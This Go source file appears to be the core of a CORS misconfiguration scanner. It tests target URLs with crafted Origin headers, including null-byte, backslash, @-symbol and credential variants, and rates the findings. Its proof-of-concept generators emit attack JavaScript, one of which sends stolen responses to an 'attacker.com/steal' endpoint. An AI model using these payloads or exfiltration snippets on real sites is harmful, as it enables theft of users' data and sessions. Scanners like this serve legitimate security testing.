package core

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
	"github.com/youwannahackme/originstrike/config"
	"github.com/youwannahackme/originstrike/http"
	"github.com/youwannahackme/originstrike/payloads"
	"github.com/youwannahackme/originstrike/utils"
)

type Scanner struct {
	config       *config.Config
	client       *http.Client
	detector     *Detector
	analyzer     *Analyzer
	validator    *Validator
	payloadGen   *payloads.Generator
	stats        *ScanStats
	results            []*ScanResult
	resultsMutex       sync.RWMutex
	failedResults      []*ScanResult
	failedResultsMutex sync.Mutex
	safeResults        []*ScanResult
	safeResultsMutex   sync.Mutex
	wg                 sync.WaitGroup
	sem                chan struct{}
	ctx                context.Context
	cancel             context.CancelFunc
}

type ScanStats struct {
	TotalURLs          int64
	ScannedURLs        int64
	VulnerableURLs     int64
	TotalRequests      int64
	TotalOriginsTested int64
	StartTime          time.Time
	EndTime            time.Time
}

type ScanResult struct {
	ID              string
	URL             string
	Origin          string
	Method          string
	Status          string
	StatusCode      int
	Severity        string
	VulnType        string
	Title           string
	Description     string
	POC             string
	Headers         map[string]string
	ResponseBody    string
	Timestamp       time.Time
	Remediation     string
	Confidence      float64
	IsConfirmed     bool
	BypassTechnique string
}

func NewScanner(cfg *config.Config) *Scanner {
	ctx, cancel := context.WithCancel(context.Background())

	return &Scanner{
		config:     cfg,
		client:     http.NewClient(cfg),
		detector:   NewDetector(cfg),
		analyzer:   NewAnalyzer(),
		validator:  NewValidator(cfg),
		payloadGen: payloads.NewGenerator(),
		stats:      &ScanStats{StartTime: time.Now()},
		sem:        make(chan struct{}, cfg.Concurrency),
		ctx:           ctx,
		cancel:        cancel,
		results:       make([]*ScanResult, 0),
		failedResults: make([]*ScanResult, 0),
		safeResults:   make([]*ScanResult, 0),
	}
}

func (s *Scanner) recordFailedResult(res *ScanResult) {
	s.failedResultsMutex.Lock()
	s.failedResults = append(s.failedResults, res)
	s.failedResultsMutex.Unlock()
}

func (s *Scanner) recordSafeResult(res *ScanResult) {
	if s.config.ShowAll && !s.config.Silent {
		color.New(color.FgBlue, color.Bold).Printf("[SAFE] ")
		color.New(color.FgWhite).Printf("%s (Origin: %s) --> Origin Not Reflected\n", res.URL, res.Origin)
	}
	s.safeResultsMutex.Lock()
	s.safeResults = append(s.safeResults, res)
	s.safeResultsMutex.Unlock()
}

func (s *Scanner) GetFailedResults() []*ScanResult {
	s.failedResultsMutex.Lock()
	defer s.failedResultsMutex.Unlock()
	return append([]*ScanResult(nil), s.failedResults...)
}

func (s *Scanner) GetSafeResults() []*ScanResult {
	s.safeResultsMutex.Lock()
	defer s.safeResultsMutex.Unlock()
	return append([]*ScanResult(nil), s.safeResults...)
}

func (s *Scanner) Start() ([]*ScanResult, error) {
	atomic.StoreInt64(&s.stats.TotalURLs, int64(len(s.config.TargetURLs)))

	// Create worker pool
	urlChan := make(chan string, len(s.config.TargetURLs))

	// Start workers
	numWorkers := s.config.Concurrency
	if numWorkers > len(s.config.TargetURLs) {
		numWorkers = len(s.config.TargetURLs)
	}

	for i := 0; i < numWorkers; i++ {
		s.wg.Add(1)
		go s.worker(urlChan)
	}

	// Send URLs to workers
loop:
	for _, url := range s.config.TargetURLs {
		select {
		case urlChan <- url:
		case <-s.ctx.Done():
			break loop
		}
	}
	close(urlChan)

	// Wait for completion
	s.wg.Wait()

	s.stats.EndTime = time.Now()

	// Run active verification on candidate results to guarantee zero false positives
	var verifiedResults []*ScanResult
	var failedVerifications []*ScanResult
	var verifMutex sync.Mutex

	verifConcurrency := s.config.Concurrency
	if verifConcurrency < 1 {
		verifConcurrency = 1
	}
	if verifConcurrency > 20 {
		verifConcurrency = 20
	}
	if verifConcurrency > len(s.results) {
		verifConcurrency = len(s.results)
	}

	if verifConcurrency > 0 {
		verifSem := make(chan struct{}, verifConcurrency)
		var verifWg sync.WaitGroup

		for _, candidate := range s.results {
			res := candidate
			verifWg.Add(1)
			go func() {
				defer verifWg.Done()
				verifSem <- struct{}{}
				defer func() { <-verifSem }()

				if s.detector.VerifyVulnerability(res) {
					isValid, reason := s.validator.Validate(res)
					if isValid {
						res.Confidence = s.validator.calculateFinalConfidence(res)
						verifMutex.Lock()
						verifiedResults = append(verifiedResults, res)
						verifMutex.Unlock()
					} else {
						if s.config.Verbose || s.config.ShowFailed {
							if !s.config.Silent {
								color.New(color.FgYellow, color.Bold).Printf("[FILTER] ")
								color.New(color.FgWhite).Printf("%s (Origin: %s) --> %s\n", res.URL, res.Origin, reason)
							}
						}
						filteredCopy := *res
						filteredCopy.Status = "FILTERED"
						filteredCopy.Description = fmt.Sprintf("Filtered out by validation rules (%s). Original: %s", reason, res.Description)
						s.recordFailedResult(&filteredCopy)
					}
				} else {
					if s.config.Verbose || s.config.ShowFailed {
						if !s.config.Silent {
							color.New(color.FgYellow, color.Bold).Printf("[FAIL] ")
							color.New(color.FgWhite).Printf("%s (Origin: %s) --> Active verification failed\n", res.URL, res.Origin)
						}
					}
					failedCopy := *res
					failedCopy.Status = "FAILED_VERIFICATION"
					failedCopy.Description = fmt.Sprintf("Active verification failed for candidate origin '%s' at %s.", res.Origin, res.URL)
					verifMutex.Lock()
					failedVerifications = append(failedVerifications, &failedCopy)
					verifMutex.Unlock()
					s.recordFailedResult(&failedCopy)
				}
			}()
		}
		verifWg.Wait()
	}

	// Validate all results (Zero False Positive Guarantee - deduplication & sort)
	validatedResults, _ := s.validator.ValidateAll(verifiedResults)

	return validatedResults, nil
}

func (s *Scanner) worker(urlChan <-chan string) {
	defer s.wg.Done()

	for url := range urlChan {
		select {
		case s.sem <- struct{}{}:
			// Acquired semaphore
			func() {
				defer func() { <-s.sem }()

				// Apply delay if configured
				if s.config.Delay > 0 {
					time.Sleep(s.config.Delay)
				}

				// Scan single URL
				results := s.scanURL(url)

				// Store results
				s.resultsMutex.Lock()
				s.results = append(s.results, results...)
				s.resultsMutex.Unlock()

				atomic.AddInt64(&s.stats.ScannedURLs, 1)
			}()

		case <-s.ctx.Done():
			return
		}
	}
}

func (s *Scanner) scanURL(targetURL string) []*ScanResult {
	var results []*ScanResult

	if !s.config.Silent {
		color.New(color.FgHiBlue, color.Bold).Printf("[INFO] ")
		color.New(color.FgWhite).Printf("Scanning target: %s\n", targetURL)
	}

	// Phase 1: Basic CORS Header Detection
	basicResults := s.phase1BasicDetection(targetURL)
	results = append(results, basicResults...)

	// Phase 2: Advanced Origin Testing
	advancedResults := s.phase2AdvancedOriginTesting(targetURL)
	results = append(results, advancedResults...)

	// Phase 3: Null Byte Injection
	nullByteResults := s.phase3NullByteInjection(targetURL)
	results = append(results, nullByteResults...)

	// Phase 4: Prefix/Suffix Bypass
	bypassResults := s.phase4BypassTechniques(targetURL)
	results = append(results, bypassResults...)

	// Phase 5: Credential Testing
	credResults := s.phase5CredentialTesting(targetURL)
	results = append(results, credResults...)

	// Phase 6: Preflight Request Analysis
	preflightResults := s.phase6PreflightAnalysis(targetURL)
	results = append(results, preflightResults...)

	// Update statistics
	if len(results) > 0 {
		atomic.AddInt64(&s.stats.VulnerableURLs, 1)
	}

	return results
}

// Phase 1: Basic CORS Header Detection
func (s *Scanner) phase1BasicDetection(targetURL string) []*ScanResult {
	var results []*ScanResult

	// Test with standard GET request
	resp, err := s.client.DoRequest(targetURL, "GET", nil, nil)
	if err != nil {
		return results
	}

	atomic.AddInt64(&s.stats.TotalRequests, 1)

	// Analyze response headers
	corsHeaders := s.analyzer.ExtractCORSHeaders(resp.Headers)

	if len(corsHeaders) == 0 {
		// No CORS headers present - check if this is intentional or misconfiguration
		if s.analyzer.ShouldHaveCORS(resp.RawResponse) {
			results = append(results, &ScanResult{
				ID:          utils.GenerateID(),
				URL:         targetURL,
				Status:      "MISSING_CORS_HEADERS",
				StatusCode:  resp.StatusCode,
				Severity:    "INFO",
				VulnType:    "Missing CORS Headers",
				Title:       "CORS Headers Not Present",
				Description: "Target does not implement CORS headers. This may be intentional but could indicate incomplete security configuration.",
				Headers:     corsHeaders,
				Timestamp:   time.Now(),
				Confidence:  60.0,
				Remediation: "Implement proper CORS headers based on your security requirements.",
			})
		}
		// Check for null origin allowance even if no default CORS headers
		nullOriginResult := s.testNullOrigin(targetURL, corsHeaders)
		if nullOriginResult != nil {
			results = append(results, nullOriginResult)
		}
		return results
	}

	// Check for wildcard origin (*)
	if origin, ok := corsHeaders["Access-Control-Allow-Origin"]; ok && origin == "*" {
		results = append(results, &ScanResult{
			ID:          utils.GenerateID(),
			URL:         targetURL,
			Origin:      "*",
			Method:      "GET",
			Status:      "VULNERABLE",
			StatusCode:  resp.StatusCode,
			Severity:    "HIGH",
			VulnType:    "Wildcard Origin (*)",
			Title:       "CORS Misconfiguration - Wildcard Origin (*)",
			Description: "Server allows any origin to access resources. This completely defeats the purpose of CORS protection.",
			POC:         s.GeneratePOC(targetURL, "*", "GET"),
			Headers:     corsHeaders,
			Timestamp:   time.Now(),
			Confidence:  100.0,
			IsConfirmed: true,
			Remediation: "Replace '*' with specific allowed origins. Never use wildcard with credentials.",
		})
	}

	// Check for null origin allowance
	nullOriginResult := s.testNullOrigin(targetURL, corsHeaders)
	if nullOriginResult != nil {
		results = append(results, nullOriginResult)
	}

	return results
}

// Phase 2: Advanced Origin Testing
func (s *Scanner) phase2AdvancedOriginTesting(targetURL string) []*ScanResult {
	var results []*ScanResult

	// Generate comprehensive origin list
	origins := s.payloadGen.GenerateAdvancedOrigins(targetURL)

	if s.config.OriginsFile != "" {
		customOrigins := s.payloadGen.LoadFromFile(s.config.OriginsFile)
		origins = append(origins, customOrigins...)
	}

	// Test each origin
	for _, origin := range origins {
		select {
		case <-s.ctx.Done():
			return results
		default:
			result := s.testOrigin(targetURL, origin)
			if result != nil {
				results = append(results, result)
			}
		}
	}

	return results
}

func (s *Scanner) testOrigin(targetURL, origin string) *ScanResult {
	headers := map[string]string{
		"Origin": origin,
	}

	resp, err := s.client.DoRequest(targetURL, "GET", headers, nil)
	if err != nil {
		return nil
	}

	atomic.AddInt64(&s.stats.TotalRequests, 1)
	atomic.AddInt64(&s.stats.TotalOriginsTested, 1)

	// Check if origin is reflected in Allow-Origin header
	allowOrigin := resp.Headers.Get("Access-Control-Allow-Origin")

	if (allowOrigin == origin || s.analyzer.IsOriginReflected(origin, allowOrigin)) && !s.detector.isTrustedOrigin(targetURL, origin) {
		severity := s.calculateSeverity(origin, resp)
		vulnType := "Arbitrary Origin Reflection"
		title := fmt.Sprintf("CORS Misconfiguration - Origin '%s' Reflected", origin)
		desc := fmt.Sprintf("Server reflects arbitrary origin '%s' back in Access-Control-Allow-Origin header.", origin)

		if origin == "*" {
			vulnType = "Wildcard Origin (*)"
			severity = "HIGH"
			title = "CORS Misconfiguration - Wildcard Origin (*)"
			desc = "Server allows any origin to access resources. This completely defeats the purpose of CORS protection."
		} else if strings.EqualFold(origin, "null") {
			vulnType = "Null Origin Allowed"
			severity = "MEDIUM"
			title = "CORS Misconfiguration - Null Origin Accepted"
			desc = "Server accepts 'null' origin, which can be exploited using sandboxed iframes."
		} else {
			// Check if credentials are also allowed
			allowCreds := resp.Headers.Get("Access-Control-Allow-Credentials")
			if allowCreds == "true" {
				severity = "CRITICAL"
				vulnType = "Credential Leakage"
				title = "CORS Misconfiguration - Credentials Exposed"
				desc = fmt.Sprintf("Server reflects arbitrary origin '%s' and allows credentials (Access-Control-Allow-Credentials: true).", origin)
			}
		}

		// Real-time output: show finding immediately
		if !s.config.Silent {
			color.New(color.FgHiGreen, color.Bold).Printf("[FOUND] ")
			color.New(color.FgWhite).Printf("%s (Origin: %s) ", targetURL, origin)
			color.New(color.FgHiGreen, color.Bold).Printf("--> %s [%s]\n", vulnType, severity)
		}

		return &ScanResult{
			ID:              utils.GenerateID(),
			URL:             targetURL,
			Origin:          origin,
			Method:          "GET",
			Status:          "VULNERABLE",
			StatusCode:      resp.StatusCode,
			Severity:        severity,
			VulnType:        vulnType,
			Title:           title,
			Description:     desc,
			POC:             s.GeneratePOC(targetURL, origin, "GET"),
			Headers:         s.analyzer.ExtractCORSHeaders(resp.Headers),
			ResponseBody:    resp.Body,
			Timestamp:       time.Now(),
			Confidence:      95.0,
			IsConfirmed:     true,
			BypassTechnique: "Origin Reflection",
			Remediation:     "Implement strict origin whitelist validation.",
		}
	}

	// Check for partial reflection (prefix/suffix matching)
	if s.analyzer.IsPartialReflection(origin, allowOrigin) && !s.detector.isTrustedOrigin(targetURL, origin) {
		// Real-time output: show partial reflection finding
		if !s.config.Silent {
			color.New(color.FgHiGreen, color.Bold).Printf("[FOUND] ")
			color.New(color.FgWhite).Printf("%s (Origin: %s) ", targetURL, origin)
			color.New(color.FgHiGreen, color.Bold).Printf("--> Partial Origin Reflection [MEDIUM]\n")
		}

		return &ScanResult{
			ID:              utils.GenerateID(),
			URL:             targetURL,
			Origin:          origin,
			Method:          "GET",
			Status:          "VULNERABLE",
			StatusCode:      resp.StatusCode,
			Severity:        "MEDIUM",
			VulnType:        "Partial Origin Reflection",
			Title:           "CORS Misconfiguration - Partial Origin Match",
			Description:     fmt.Sprintf("Server partially matches origin. Sent: '%s', Received: '%s'", origin, allowOrigin),
			POC:             s.GeneratePOC(targetURL, origin, "GET"),
			Headers:         s.analyzer.ExtractCORSHeaders(resp.Headers),
			Timestamp:       time.Now(),
			Confidence:      85.0,
			IsConfirmed:     true,
			BypassTechnique: "Partial Match Bypass",
			Remediation:     "Use exact origin matching instead of prefix/suffix matching.",
		}
	}

	// Real-time verbose output: show tested origin that was not reflected
	if !s.config.Silent && s.config.Verbose {
		color.New(color.FgHiBlue, color.Bold).Printf("[INFO] ")
		color.New(color.FgWhite).Printf("%s (Origin: %s) --> Not Reflected\n", targetURL, origin)
	}

	if s.config.ShowAll {
		s.recordSafeResult(&ScanResult{
			ID:          utils.GenerateID(),
			URL:         targetURL,
			Origin:      origin,
			Method:      "GET",
			Status:      "SAFE",
			StatusCode:  resp.StatusCode,
			Severity:    "INFO",
			VulnType:    "Origin Not Reflected",
			Title:       fmt.Sprintf("Safe Origin Check - '%s'", origin),
			Description: fmt.Sprintf("Origin '%s' was tested and not reflected or accepted by the server.", origin),
			Headers:     s.analyzer.ExtractCORSHeaders(resp.Headers),
			Timestamp:   time.Now(),
		})
	}

	return nil
}

// Phase 3: Null Byte Injection
func (s *Scanner) phase3NullByteInjection(targetURL string) []*ScanResult {
	var results []*ScanResult

	nullPayloads := s.payloadGen.GenerateNullBytePayloads(targetURL)

	for _, payload := range nullPayloads {
		headers := map[string]string{
			"Origin": payload,
		}

		resp, err := s.client.DoRequest(targetURL, "GET", headers, nil)
		if err != nil {
			continue
		}

		atomic.AddInt64(&s.stats.TotalRequests, 1)
		atomic.AddInt64(&s.stats.TotalOriginsTested, 1)

		allowOrigin := resp.Headers.Get("Access-Control-Allow-Origin")

		// Check if null byte stripped and origin allowed
		if allowOrigin != "" && s.analyzer.IsNullByteBypassSuccessful(payload, allowOrigin) {
			// Real-time output
			if !s.config.Silent {
				color.New(color.FgHiGreen, color.Bold).Printf("[FOUND] ")
				color.New(color.FgWhite).Printf("%s (Origin: %s) ", targetURL, payload)
				color.New(color.FgHiGreen, color.Bold).Printf("--> Null Byte Injection [CRITICAL]\n")
			}
			results = append(results, &ScanResult{
				ID:              utils.GenerateID(),
				URL:             targetURL,
				Origin:          payload,
				Method:          "GET",
				Status:          "VULNERABLE",
				StatusCode:      resp.StatusCode,
				Severity:        "CRITICAL",
				VulnType:        "Null Byte Injection",
				Title:           "CORS Bypass via Null Byte Injection",
				Description:     "Null byte injection successfully bypasses CORS origin validation.",
				POC:             s.GeneratePOC(targetURL, payload, "GET"),
				Headers:         s.analyzer.ExtractCORSHeaders(resp.Headers),
				Timestamp:       time.Now(),
				Confidence:      99.0,
				IsConfirmed:     true,
				BypassTechnique: "Null Byte Injection",
				Remediation:     "Sanitize input properly. Reject origins containing null bytes.",
			})
		} else if !s.config.Silent && s.config.Verbose {
			color.New(color.FgHiBlue, color.Bold).Printf("[INFO] ")
			color.New(color.FgWhite).Printf("%s (NullByte: %s) --> Not Bypassed\n", targetURL, payload)
		}
	}

	return results
}

// Phase 4: Advanced Bypass Techniques
func (s *Scanner) phase4BypassTechniques(targetURL string) []*ScanResult {
	var results []*ScanResult

	// Technique 1: Underscore subdomain bypass
	underscoreOrigins := s.payloadGen.GenerateUnderscoreSubdomainOrigins(targetURL)
	for _, origin := range underscoreOrigins {
		if result := s.testOrigin(targetURL, origin); result != nil {
			result.BypassTechnique = "Underscore Subdomain"
			results = append(results, result)
		}
	}

	// Technique 2: Case variation bypass
	caseVariations := s.payloadGen.GenerateCaseVariations(targetURL)
	for _, origin := range caseVariations {
		if result := s.testOrigin(targetURL, origin); result != nil {
			result.BypassTechnique = "Case Variation"
			result.Confidence = 90.0
			results = append(results, result)
		}
	}

	// Technique 3: URL encoding bypass
	encodedOrigins := s.payloadGen.GenerateURLEncodedOrigins(targetURL)
	for _, origin := range encodedOrigins {
		if result := s.testOrigin(targetURL, origin); result != nil {
			result.BypassTechnique = "URL Encoding"
			results = append(results, result)
		}
	}

	// Technique 4: Backslash bypass (http://evil.com\target.com)
	backslashOrigins := s.payloadGen.GenerateBackslashBypassOrigins(targetURL)
	for _, origin := range backslashOrigins {
		if result := s.testOrigin(targetURL, origin); result != nil {
			result.BypassTechnique = "Backslash Bypass"
			result.Severity = "CRITICAL"
			results = append(results, result)
		}
	}

	// Technique 5: @ symbol bypass (http://evil.com@target.com)
	atSymbolOrigins := s.payloadGen.GenerateAtSymbolBypassOrigins(targetURL)
	for _, origin := range atSymbolOrigins {
		if result := s.testOrigin(targetURL, origin); result != nil {
			result.BypassTechnique = "@ Symbol Bypass"
			result.Severity = "CRITICAL"
			results = append(results, result)
		}
	}

	// Technique 6: # fragment bypass
	fragmentOrigins := s.payloadGen.GenerateFragmentBypassOrigins(targetURL)
	for _, origin := range fragmentOrigins {
		if result := s.testOrigin(targetURL, origin); result != nil {
			result.BypassTechnique = "Fragment Bypass"
			results = append(results, result)
		}
	}

	// Technique 7: DNS rebinding preparation (special domains)
	dnsOrigins := s.payloadGen.GenerateDNSRebindingOrigins()
	for _, origin := range dnsOrigins {
		if result := s.testOrigin(targetURL, origin); result != nil {
			result.BypassTechnique = "DNS Rebinding Preparation"
			result.Severity = "CRITICAL"
			results = append(results, result)
		}
	}

	return results
}

// Phase 5: Credential Testing
func (s *Scanner) phase5CredentialTesting(targetURL string) []*ScanResult {
	var results []*ScanResult

	// Test with credentials
	testOrigins := []string{
		"https://evil.com",
		"null",
		"https://attacker.com",
	}

	for _, origin := range testOrigins {
		headers := map[string]string{
			"Origin":        origin,
			"Cookie":        "session=test",
			"Authorization": "Bearer test-token",
		}

		resp, err := s.client.DoRequestWithCredentials(targetURL, "GET", headers, nil)
		if err != nil {
			continue
		}

		atomic.AddInt64(&s.stats.TotalRequests, 1)
		atomic.AddInt64(&s.stats.TotalOriginsTested, 1)

		allowOrigin := resp.Headers.Get("Access-Control-Allow-Origin")
		allowCreds := resp.Headers.Get("Access-Control-Allow-Credentials")

		// Critical: Allow-Credentials: true with non-exact origin
		if allowCreds == "true" && allowOrigin != "" && allowOrigin != targetURL {
			// Real-time output
			if !s.config.Silent {
				color.New(color.FgHiGreen, color.Bold).Printf("[FOUND] ")
				color.New(color.FgWhite).Printf("%s (Origin: %s) ", targetURL, origin)
				color.New(color.FgHiGreen, color.Bold).Printf("--> Credential Leakage [CRITICAL]\n")
			}
			results = append(results, &ScanResult{
				ID:          utils.GenerateID(),
				URL:         targetURL,
				Origin:      origin,
				Method:      "GET",
				Status:      "VULNERABLE",
				StatusCode:  resp.StatusCode,
				Severity:    "CRITICAL",
				VulnType:    "Credential Leakage",
				Title:       "CORS Misconfiguration - Credentials Exposed",
				Description: "Server allows credentials to be sent from untrusted origins. This enables credential theft.",
				POC:         s.generateCredentialPOC(targetURL, origin),
				Headers: map[string]string{
					"Access-Control-Allow-Origin":      allowOrigin,
					"Access-Control-Allow-Credentials": allowCreds,
				},
				Timestamp:       time.Now(),
				Confidence:      100.0,
				IsConfirmed:     true,
				BypassTechnique: "Credential Exposure",
				Remediation:     "Never set Access-Control-Allow-Credentials: true with wildcard or untrusted origins.",
			})
		} else if !s.config.Silent && s.config.Verbose {
			color.New(color.FgHiBlue, color.Bold).Printf("[INFO] ")
			color.New(color.FgWhite).Printf("%s (Credential Test: %s) --> No Leakage\n", targetURL, origin)
		}
	}

	return results
}

// Phase 6: Preflight Request Analysis
func (s *Scanner) phase6PreflightAnalysis(targetURL string) []*ScanResult {
	var results []*ScanResult

	// Send OPTIONS request (preflight)
	headers := map[string]string{
		"Origin":                         "https://evil.com",
		"Access-Control-Request-Method":  "GET",
		"Access-Control-Request-Headers": "X-Custom-Header",
	}

	resp, err := s.client.DoRequest(targetURL, "OPTIONS", headers, nil)
	if err != nil {
		return results
	}

	atomic.AddInt64(&s.stats.TotalRequests, 1)
	atomic.AddInt64(&s.stats.TotalOriginsTested, 1)

	allowMethods := resp.Headers.Get("Access-Control-Allow-Methods")
	allowHeaders := resp.Headers.Get("Access-Control-Allow-Headers")
	allowOrigin := resp.Headers.Get("Access-Control-Allow-Origin")

	// Check for overly permissive preflight
	if allowOrigin == "https://evil.com" || allowOrigin == "*" {
		if s.analyzer.IsOverlyPermissiveMethods(allowMethods) ||
			s.analyzer.IsOverlyPermissiveHeaders(allowHeaders) {
			results = append(results, &ScanResult{
				ID:          utils.GenerateID(),
				URL:         targetURL,
				Origin:      "https://evil.com",
				Method:      "OPTIONS",
				Status:      "VULNERABLE",
				StatusCode:  resp.StatusCode,
				Severity:    "HIGH",
				VulnType:    "Permissive Preflight",
				Title:       "CORS Misconfiguration - Overly Permissive Preflight",
				Description: "Preflight response allows unauthorized origins/methods/headers.",
				POC:         s.generatePreflightPOC(targetURL),
				Headers: map[string]string{
					"Access-Control-Allow-Origin":  allowOrigin,
					"Access-Control-Allow-Methods": allowMethods,
					"Access-Control-Allow-Headers": allowHeaders,
				},
				Timestamp:       time.Now(),
				Confidence:      95.0,
				IsConfirmed:     true,
				BypassTechnique: "Preflight Bypass",
				Remediation:     "Restrict allowed methods and headers to minimum required.",
			})
		}
	}

	return results
}

func (s *Scanner) testNullOrigin(targetURL string, existingHeaders map[string]string) *ScanResult {
	_ = existingHeaders
	headers := map[string]string{
		"Origin": "null",
	}

	resp, err := s.client.DoRequest(targetURL, "GET", headers, nil)
	if err != nil {
		return nil
	}

	atomic.AddInt64(&s.stats.TotalRequests, 1)

	allowOrigin := resp.Headers.Get("Access-Control-Allow-Origin")

	if allowOrigin == "null" {
		return &ScanResult{
			ID:          utils.GenerateID(),
			URL:         targetURL,
			Origin:      "null",
			Method:      "GET",
			Status:      "VULNERABLE",
			StatusCode:  resp.StatusCode,
			Severity:    "MEDIUM",
			VulnType:    "Null Origin Allowed",
			Title:       "CORS Misconfiguration - Null Origin Accepted",
			Description: "Server accepts 'null' origin, which can be exploited using sandboxed iframes.",
			POC:         s.generateNullOriginPOC(targetURL),
			Headers:     s.analyzer.ExtractCORSHeaders(resp.Headers),
			Timestamp:   time.Now(),
			Confidence:  95.0,
			IsConfirmed: true,
			Remediation: "Reject 'null' origin explicitly in server-side validation.",
		}
	}

	if s.config.ShowAll {
		s.recordSafeResult(&ScanResult{
			ID:          utils.GenerateID(),
			URL:         targetURL,
			Origin:      "null",
			Method:      "GET",
			Status:      "SAFE",
			StatusCode:  resp.StatusCode,
			Severity:    "INFO",
			VulnType:    "Null Origin Check",
			Title:       "Safe Check - Null Origin Rejected",
			Description: "Server correctly rejected 'null' origin.",
			Headers:     s.analyzer.ExtractCORSHeaders(resp.Headers),
			Timestamp:   time.Now(),
		})
	}

	return nil
}

func (s *Scanner) calculateSeverity(origin string, resp *http.Response) string {
	// Critical patterns
	criticalPatterns := []string{
		"evil", "attacker", "malicious", "hack",
		"javascript:", "data:",
	}

	for _, pattern := range criticalPatterns {
		if containsIgnoreCase(origin, pattern) {
			return "CRITICAL"
		}
	}

	// High severity for common attacker domains
	highPatterns := []string{
		".com", ".org", ".net", ".io",
	}

	for _, pattern := range highPatterns {
		if contains(origin, pattern) && !contains(origin, extractDomain(resp.RequestURL)) {
			return "HIGH"
		}
	}

	return "MEDIUM"
}

func (s *Scanner) GeneratePOC(targetURL, origin, method string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - %s</title>
</head>
<body>
    <h2>CORS Vulnerability Proof of Concept</h2>
    <p>Target: <code>%s</code></p>
    <p>Malicious Origin: <code>%s</code></p>
    <script>
        fetch('%s', {
            method: '%s',
            headers: {
                'Origin': '%s'
            },
            credentials: 'include'
        })
        .then(response => response.text())
        .then(data => {
            document.getElementById('result').innerText = data;
            console.log('CORS Exploit Successful!');
            console.log('Stolen Data:', data);
        })
        .catch(error => console.error('Error:', error));
    </script>
    <h3>Stolen Response:</h3>
    <pre id="result"></pre>
</body>
</html>`, origin, targetURL, origin, targetURL, method, origin)
}

func (s *Scanner) generateCredentialPOC(targetURL, origin string) string {
	return fmt.Sprintf(`<!-- CRITICAL: Credential Theft PoC -->
<script>
    // This script steals cookies/auth tokens from authenticated users
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '%s', true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('Origin', '%s');
    xhr.onload = function() {
        // Send stolen data to attacker server
        fetch('https://attacker.com/steal?data=' + btoa(xhr.responseText));
        alert('Credentials Stolen! Check console.');
    };
    xhr.send();
</script>`, targetURL, origin)
}

func (s *Scanner) generateNullOriginPOC(targetURL string) string {
	return fmt.Sprintf(`<!-- Null Origin Exploit via Sandbox -->
<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '%s');
        xhr.setRequestHeader('Origin', 'null');
        xhr.onload = function() { parent.postMessage(xhr.responseText, '*'); };
        xhr.send();
    </script>
"></iframe>
<script>
    window.onmessage = function(e) { console.log('Stolen via null origin:', e.data); };
</script>`, targetURL)
}

func (s *Scanner) generatePreflightPOC(targetURL string) string {
	return fmt.Sprintf(`<!-- Preflight Bypass PoC -->
<script>
    fetch('%s', {
        method: 'DELETE',
        headers: {
            'Content-Type': 'application/json',
            'X-Custom-Header': 'hacked',
            'Origin': 'https://evil.com'
        },
        credentials: 'include'
    }).then(r => console.log('Dangerous action executed!', r));
</script>`, targetURL)
}

// GetTotalPayloadCount returns the exact total number of origin payloads to be tested across all target URLs and phases
func (s *Scanner) GetTotalPayloadCount() int {
	total := 0
	for _, targetURL := range s.config.TargetURLs {
		// Phase 2: Advanced origins + custom origins from file
		total += len(s.payloadGen.GenerateAdvancedOrigins(targetURL))
		if s.config.OriginsFile != "" {
			total += len(s.payloadGen.LoadFromFile(s.config.OriginsFile))
		}
		// Phase 3: Null byte injection payloads
		total += len(s.payloadGen.GenerateNullBytePayloads(targetURL))
		// Phase 4: Bypass techniques
		total += len(s.payloadGen.GenerateUnderscoreSubdomainOrigins(targetURL))
		total += len(s.payloadGen.GenerateCaseVariations(targetURL))
		total += len(s.payloadGen.GenerateURLEncodedOrigins(targetURL))
		total += len(s.payloadGen.GenerateBackslashBypassOrigins(targetURL))
		total += len(s.payloadGen.GenerateAtSymbolBypassOrigins(targetURL))
		total += len(s.payloadGen.GenerateFragmentBypassOrigins(targetURL))
		total += len(s.payloadGen.GenerateDNSRebindingOrigins())
		// Phase 5: Credential testing origins (3)
		total += 3
		// Phase 6: Preflight analysis (1)
		total += 1
	}
	return total
}

func (s *Scanner) GetStats() *ScanStats {
	return s.stats
}



// Helper functions
func contains(s, substr string) bool {
	return strings.Contains(s, substr)
}

func containsIgnoreCase(s, substr string) bool {
	return strings.Contains(strings.ToLower(s), strings.ToLower(substr))
}

func extractDomain(rawURL string) string {
	rawURL = strings.TrimSpace(rawURL)
	if !strings.HasPrefix(strings.ToLower(rawURL), "http://") && !strings.HasPrefix(strings.ToLower(rawURL), "https://") {
		rawURL = "https://" + rawURL
	}
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	return u.Hostname()
}
